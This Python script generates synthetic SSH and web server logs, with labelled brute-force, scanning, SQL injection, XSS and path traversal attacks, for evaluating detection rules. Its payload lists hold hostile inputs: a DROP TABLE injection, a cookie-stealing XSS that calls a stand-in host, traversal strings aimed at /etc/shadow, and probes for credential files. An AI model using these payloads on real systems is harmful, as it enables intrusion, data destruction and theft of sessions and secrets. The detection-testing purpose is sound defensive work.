"""Generate realistic *synthetic* SSH and web logs with labelled attacks.

Everything this script produces is made up: user names are generic first names,
and all IP addresses come from ranges reserved for documentation and private
use (10.0.0.0/8, 100.64.0.0/10, 198.51.100.0/24, 203.0.113.0/24), so no real
person or host is ever referenced.

Output (in ``--out``):

* ``auth.log``   - sshd lines in RFC 3339 syslog format (Ubuntu 23.10+ default)
* ``access.log`` - Nginx combined format
* ``labels.csv`` - ground truth: one row per injected attack, used for evaluation

Normal traffic deliberately includes things that *look* suspicious but are not
labelled as attacks (on-call logins at night, an internal broken-link checker,
internet background noise). These produce honest false positives in the evaluation.

Usage::

    python -m simulator.generate --out data/samples --days 2 --seed 7
"""

from __future__ import annotations

import argparse
import csv
import random
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path
from urllib.parse import quote

IST_OFFSET = timedelta(hours=5, minutes=30)  # business hours are in India Standard Time

EMPLOYEES = [
    "aarav", "priya", "rohan", "ananya", "vikram", "meera", "arjun", "kavya", "sanjay",
    "divya", "rahul", "sneha", "karthik", "pooja", "aditya", "nisha", "varun", "lakshmi",
    "deepak", "swati", "deploy", "backup", "jenkins", "ops", "monitor",
]  # fmt: skip
ATTACK_USERNAMES = [
    "root", "admin", "test", "user", "oracle", "postgres", "ubuntu", "guest", "ftp",
    "mysql", "git", "pi", "support", "administrator", "www-data", "tomcat", "hadoop",
    "nagios", "minecraft", "steam", "dev", "centos", "ec2-user", "student", "teamspeak",
    "ts3", "sales", "info", "webmaster", "test1", "test2", "operator", "alex", "john",
    "demo", "elastic", "kafka", "redis", "jira", "zabbix",
]  # fmt: skip
BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
]  # fmt: skip
CRAWLER_UA = "Mozilla/5.0 (compatible; ExampleBot/2.1; +https://example.com/bot)"
PAGES = ["/", "/products", "/about", "/contact", "/cart", "/login", "/blog", "/faq", "/pricing"]
ASSETS = ["/static/app.js", "/static/style.css", "/static/logo.png", "/favicon.ico"]
SEARCH_WORDS = ["laptop", "chair", "desk lamp", "monitor", "keyboard", "bag", "headphones"]
SCAN_PATHS = [
    "/.env", "/.git/config", "/wp-login.php", "/wp-admin/", "/phpmyadmin/", "/admin/",
    "/admin.php", "/backup.zip", "/db.sql", "/config.php", "/server-status", "/.aws/credentials",
    "/actuator/env", "/console", "/manager/html", "/cgi-bin/test.cgi", "/.DS_Store",
    "/api/v1/users", "/debug", "/test.php", "/info.php", "/shell.php", "/xmlrpc.php",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/old/", "/temp/", "/uploads/",
]  # fmt: skip
SQLI_PAYLOADS = [
    "1' OR '1'='1", "1 UNION SELECT username,password FROM users--", "1' AND SLEEP(5)--",
    "1'; DROP TABLE users; --", "' OR 1=1 #", "1 UNION ALL SELECT NULL,table_name FROM information_schema.tables",
    "1' AND BENCHMARK(5000000,MD5(1))--", "admin'--",
]  # fmt: skip
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert(1)>", "javascript:alert('xss')", "\"><script>fetch('//x.example/'+document.cookie)</script>",
]  # fmt: skip
TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "%252e%252e%252f%252e%252e%252fetc%252fshadow",
    "....//....//etc/passwd", "..\\..\\..\\windows\\win.ini", "/proc/self/environ",
]  # fmt: skip


@dataclass
class Label:
    attack_id: str
    attack_type: str
    src_ip: str
    username: str
    start: datetime
    end: datetime
    mitre: str
    expected_rule: str
    log: str


@dataclass
class Generator:
    start: datetime
    days: int
    rng: random.Random
    ssh_lines: list[tuple[datetime, str]] = field(default_factory=list)
    web_lines: list[tuple[datetime, str]] = field(default_factory=list)
    labels: list[Label] = field(default_factory=list)
    _used_ips: set[str] = field(default_factory=set)

    # ------------------------------------------------------------------ helpers

    @property
    def end(self) -> datetime:
        return self.start + timedelta(days=self.days)

    def fresh_ip(self, prefix: str) -> str:
        """A not-yet-used IP inside the given documentation/private prefix."""
        while True:
            if prefix.count(".") == 1:
                ip = f"{prefix}.{self.rng.randint(0, 255)}.{self.rng.randint(1, 254)}"
            else:
                ip = f"{prefix}.{self.rng.randint(1, 254)}"
            if ip not in self._used_ips:
                self._used_ips.add(ip)
                return ip

    def ssh(self, ts: datetime, host: str, msg: str) -> None:
        pid = self.rng.randint(1000, 65000)
        stamp = ts.isoformat(timespec="microseconds")
        self.ssh_lines.append((ts, f"{stamp} {host} sshd[{pid}]: {msg}"))

    def web(self, ts: datetime, ip: str, method: str, path: str, status: int, ua: str) -> None:
        size = 0 if status in (301, 304) else self.rng.randint(200, 48000)
        stamp = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
        line = f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'
        self.web_lines.append((ts, line))

    def business_time(self, day: int) -> datetime:
        """A random time between 09:00 and 19:00 IST on the given day (returned in UTC)."""
        local_midnight = self.start + timedelta(days=day) - IST_OFFSET
        return local_midnight + timedelta(hours=self.rng.uniform(9, 19))

    def random_time(self, margin_hours: float = 2) -> datetime:
        span = self.days * 24 - margin_hours
        return self.start + timedelta(hours=self.rng.uniform(0.5, span))

    def port(self) -> int:
        return self.rng.randint(32768, 60999)

    def failed_login(self, ts: datetime, host: str, ip: str, user: str, valid: bool) -> None:
        port = self.port()
        if not valid:
            self.ssh(ts, host, f"Invalid user {user} from {ip} port {port}")
            self.ssh(
                ts, host, f"Failed password for invalid user {user} from {ip} port {port} ssh2"
            )
        else:
            self.ssh(ts, host, f"Failed password for {user} from {ip} port {port} ssh2")
        self.ssh(
            ts + timedelta(seconds=1),
            host,
            f"Connection closed by authenticating user {user} {ip} port {port} [preauth]",
        )

    def successful_login(self, ts: datetime, host: str, ip: str, user: str, method: str) -> None:
        port = self.port()
        suffix = ": ED25519 SHA256:" + "".join(self.rng.choices("abcdefXYZ0123456789", k=20))
        self.ssh(
            ts,
            host,
            f"Accepted {method} for {user} from {ip} port {port} ssh2"
            + (suffix if method == "publickey" else ""),
        )
        self.ssh(
            ts, host, f"pam_unix(sshd:session): session opened for user {user}(uid=1001) by (uid=0)"
        )
        end = ts + timedelta(minutes=self.rng.uniform(2, 90))
        self.ssh(end, host, f"Received disconnect from {ip} port {port}:11: disconnected by user")
        self.ssh(end, host, f"pam_unix(sshd:session): session closed for user {user}")

    def label(self, kind: str, ip: str, user: str, start: datetime, end: datetime,
              mitre: str, rule: str, log: str) -> None:  # fmt: skip
        attack_id = f"ATK-{len(self.labels) + 1:03d}"
        self.labels.append(Label(attack_id, kind, ip, user, start, end, mitre, rule, log))

    # ------------------------------------------------------------------ normal traffic

    def normal_ssh(self) -> None:
        homes = {u: self.fresh_ip("10.20") for u in EMPLOYEES}
        for day in range(self.days):
            for user in EMPLOYEES:
                for _ in range(self.rng.choice([0, 1, 1, 2, 3])):
                    ts = self.business_time(day)
                    host = self.rng.choice(["bastion-01", "bastion-01", "app-01"])
                    if self.rng.random() < 0.08:  # a typo or two before getting it right
                        for i in range(self.rng.randint(1, 2)):
                            self.failed_login(
                                ts + timedelta(seconds=5 * i), host, homes[user], user, True
                            )
                        ts += timedelta(seconds=15)
                    method = "publickey" if self.rng.random() < 0.7 else "password"
                    self.successful_login(ts, host, homes[user], user, method)
        # Unlabelled on-call work at night: these are real false positives for SSH-004.
        for user in ["ops", "karthik"]:
            ts = self.start + timedelta(
                days=self.rng.randrange(self.days), hours=self.rng.uniform(17, 20)
            )
            self.successful_login(ts, "app-01", homes[user], user, "publickey")
        # Internet background noise: many IPs, each trying a couple of passwords.
        for _ in range(60 * self.days):
            ip = self.fresh_ip("198.51.100") if self.rng.random() < 0.5 else self.fresh_ip("100.70")
            ts = self.random_time()
            for i in range(self.rng.randint(1, 3)):
                user = self.rng.choice(ATTACK_USERNAMES)
                self.failed_login(
                    ts + timedelta(seconds=7 * i), "bastion-01", ip, user, user == "root"
                )

    def normal_web(self) -> None:
        visitors_per_day = 220
        for day in range(self.days):
            for _ in range(visitors_per_day):
                ip = self.fresh_ip("100.64") if self.rng.random() < 0.8 else self.fresh_ip("100.65")
                ua = self.rng.choice(BROWSER_UAS)
                # Most traffic during Indian daytime; some round the clock.
                ts = (
                    self.business_time(day)
                    if self.rng.random() < 0.75
                    else (self.start + timedelta(days=day, hours=self.rng.uniform(0, 24)))
                )
                for _ in range(self.rng.randint(2, 12)):
                    roll = self.rng.random()
                    if roll < 0.15:
                        path = f"/products/{self.rng.randint(1, 400)}"
                    elif roll < 0.25:
                        path = "/search?q=" + quote(self.rng.choice(SEARCH_WORDS))
                    elif roll < 0.32:
                        path = f"/api/items?page={self.rng.randint(1, 20)}"
                    else:
                        path = self.rng.choice(PAGES)
                    status = 200
                    if self.rng.random() < 0.03:
                        status = 404
                    elif self.rng.random() < 0.005:
                        status = 500
                    method = (
                        "POST" if path in ("/login", "/cart") and self.rng.random() < 0.3 else "GET"
                    )
                    self.web(ts, ip, method, path, status, ua)
                    for asset in self.rng.sample(ASSETS, self.rng.randint(0, 3)):
                        self.web(ts + timedelta(seconds=0.3), ip, "GET", asset,
                                 self.rng.choice([200, 304]), ua)  # fmt: skip
                    ts += timedelta(seconds=self.rng.uniform(3, 90))
        # Uptime monitor: one health check per minute, all day, from one internal IP.
        monitor_ip = self.fresh_ip("10.0.0")
        ts = self.start
        while ts < self.end:
            self.web(ts, monitor_ip, "GET", "/health", 200, "uptime-monitor/1.4")
            ts += timedelta(seconds=60)
        # Search engine crawler: steady, many distinct URLs, a few 404s.
        crawler_ip = self.fresh_ip("198.51.100")
        ts = self.start
        while ts < self.end:
            path = f"/products/{self.rng.randint(1, 600)}"
            status = 404 if self.rng.random() < 0.08 else 200
            self.web(ts, crawler_ip, "GET", path, status, CRAWLER_UA)
            ts += timedelta(seconds=self.rng.uniform(20, 70))
        # Nightly internal broken-link checker: a burst of 404s that is NOT an attack.
        checker_ip = self.fresh_ip("10.0.0")
        for day in range(self.days):
            ts = self.start + timedelta(days=day, hours=20, minutes=30)
            for i in range(40):
                path = f"/blog/2019/old-post-{i}"
                self.web(ts + timedelta(seconds=i * 1.5), checker_ip, "GET", path,
                         404 if i % 4 else 200, "linkchecker/10.2")  # fmt: skip

    # ------------------------------------------------------------------ attacks

    def brute_force(self) -> None:
        ip = self.fresh_ip("203.0.113")
        start = self.random_time()
        ts = start
        user = self.rng.choice(["root", "admin"])
        for _ in range(self.rng.randint(60, 150)):
            self.failed_login(ts, "bastion-01", ip, user, user == "root")
            ts += timedelta(seconds=self.rng.uniform(1, 6))
        self.label("brute_force", ip, user, start, ts, "T1110.001", "SSH-001", "ssh")

    def password_spray(self) -> None:
        ip = self.fresh_ip("203.0.113")
        start = self.random_time()
        ts = start
        users = self.rng.sample(ATTACK_USERNAMES + EMPLOYEES[:10], self.rng.randint(20, 35))
        for user in users:
            self.failed_login(ts, "bastion-01", ip, user, user in EMPLOYEES)
            ts += timedelta(seconds=self.rng.uniform(20, 60))
        self.label("password_spray", ip, "", start, ts, "T1110.003", "SSH-002", "ssh")

    def brute_force_success(self) -> None:
        ip = self.fresh_ip("203.0.113")
        start = self.random_time()
        ts = start
        for _ in range(self.rng.randint(12, 20)):
            self.failed_login(ts, "app-01", ip, "deploy", True)
            ts += timedelta(seconds=self.rng.uniform(2, 8))
        self.successful_login(ts, "app-01", ip, "deploy", "password")
        self.label("brute_force_success", ip, "deploy", start, ts, "T1078", "SSH-003", "ssh")

    def off_hours_login(self) -> None:
        """A stolen password used at 02:30 IST from an IP the user never used before."""
        ip = self.fresh_ip("203.0.113")
        day = self.rng.randrange(self.days)
        ts = self.start + timedelta(days=day, hours=2, minutes=30) - IST_OFFSET
        if ts < self.start:
            ts += timedelta(days=1)
        self.successful_login(ts, "bastion-01", ip, "priya", "password")
        self.label(
            "off_hours_login", ip, "priya", ts, ts + timedelta(minutes=1), "T1078", "SSH-004", "ssh"
        )

    def low_and_slow(self) -> None:
        """Brute force slowed down to stay under thresholds. Rules are expected to miss this."""
        ip = self.fresh_ip("203.0.113")
        start = self.random_time(margin_hours=8)
        ts = start
        while ts < start + timedelta(hours=6):
            self.failed_login(ts, "bastion-01", ip, "root", True)
            ts += timedelta(minutes=self.rng.uniform(6, 12))
        self.label("low_and_slow_brute_force", ip, "root", start, ts, "T1110.001", "SSH-001", "ssh")

    def web_scan(self, scanner_ua: bool) -> None:
        ip = self.fresh_ip("203.0.113")
        ua = (
            "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"
            if scanner_ua
            else self.rng.choice(BROWSER_UAS)
        )
        start = self.random_time()
        ts = start
        for _ in range(self.rng.randint(300, 600)):
            base = self.rng.choice(SCAN_PATHS)
            path = (
                base if self.rng.random() < 0.5 else f"{base.rstrip('/')}{self.rng.randint(1, 99)}"
            )
            status = self.rng.choices([404, 403, 200, 301], weights=[85, 8, 4, 3])[0]
            self.web(ts, ip, "GET", path, status, ua)
            ts += timedelta(seconds=self.rng.uniform(0.2, 0.9))
        rules = "WEB-001;WEB-005" if scanner_ua else "WEB-001"
        self.label("web_scan", ip, "", start, ts, "T1595.003", rules, "web")

    def injection(self, kind: str) -> None:
        payloads, rule = {
            "sqli": (SQLI_PAYLOADS, "WEB-002"),
            "xss": (XSS_PAYLOADS, "WEB-003"),
            "path_traversal": (TRAVERSAL_PAYLOADS, "WEB-004"),
        }[kind]
        ip = self.fresh_ip("203.0.113")
        use_tool = kind == "sqli" and self.rng.random() < 0.5
        ua = (
            "sqlmap/1.8.2#stable (https://sqlmap.org)" if use_tool else self.rng.choice(BROWSER_UAS)
        )
        start = self.random_time()
        ts = start
        targets = {"sqli": ["/products?id=", "/search?q=", "/api/items?sort="],
                   "xss": ["/search?q=", "/contact?name=", "/blog?comment="],
                   "path_traversal": ["/download?file=", "/static/", "/view?page="]}[kind]  # fmt: skip
        for _ in range(self.rng.randint(8, 25)):
            # Mix of plain, URL-encoded and double-encoded payloads, like real tools send.
            payload = self.rng.choice(payloads)
            encoded = (
                quote(payload, safe="") if self.rng.random() < 0.6 else payload.replace(" ", "%20")
            )
            path = self.rng.choice(targets) + encoded
            status = self.rng.choices([400, 403, 500, 200], weights=[30, 30, 20, 20])[0]
            self.web(ts, ip, "GET", path, status, ua)
            ts += timedelta(seconds=self.rng.uniform(2, 20))
        rules = f"{rule};WEB-005" if use_tool else rule
        mitre = "T1190"
        self.label(kind, ip, "", start, ts, mitre, rules, "web")

    # ------------------------------------------------------------------ run

    def generate(self) -> None:
        self.normal_ssh()
        self.normal_web()
        for i in range(2):
            self.brute_force()
            self.password_spray()
            self.web_scan(scanner_ua=i == 0)
            self.injection("sqli")
        self.brute_force_success()
        self.off_hours_login()
        self.low_and_slow()
        self.injection("xss")
        self.injection("path_traversal")

    def write(self, out: Path) -> dict[str, int]:
        out.mkdir(parents=True, exist_ok=True)
        ssh = [line for _, line in sorted(self.ssh_lines, key=lambda x: x[0])]
        web = [line for _, line in sorted(self.web_lines, key=lambda x: x[0])]
        (out / "auth.log").write_text("\n".join(ssh) + "\n")
        (out / "access.log").write_text("\n".join(web) + "\n")
        with (out / "labels.csv").open("w", newline="") as fh:
            writer = csv.writer(fh)
            writer.writerow(["attack_id", "attack_type", "src_ip", "username", "start", "end",
                             "mitre", "expected_rules", "log"])  # fmt: skip
            for lb in self.labels:
                writer.writerow([lb.attack_id, lb.attack_type, lb.src_ip, lb.username,
                                 lb.start.isoformat(), lb.end.isoformat(), lb.mitre,
                                 lb.expected_rule, lb.log])  # fmt: skip
        return {"ssh_lines": len(ssh), "web_lines": len(web), "attacks": len(self.labels)}


def generate(
    out: Path, days: int = 2, seed: int = 7, start: datetime | None = None
) -> dict[str, int]:
    """Generate the three files and return line counts."""
    if start is None:
        today = datetime.now(UTC).replace(hour=0, minute=0, second=0, microsecond=0)
        start = today - timedelta(days=days)
    gen = Generator(start=start, days=days, rng=random.Random(seed))
    gen.generate()
    return gen.write(out)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    parser.add_argument("--out", type=Path, default=Path("data/samples"))
    parser.add_argument("--days", type=int, default=2)
    parser.add_argument("--seed", type=int, default=7)
    parser.add_argument("--start", help="UTC start date, e.g. 2026-11-16 (default: N days ago)")
    args = parser.parse_args()
    start = datetime.fromisoformat(args.start).replace(tzinfo=UTC) if args.start else None
    counts = generate(args.out, args.days, args.seed, start)
    print(f"Wrote {counts} to {args.out}")


if __name__ == "__main__":
    main()
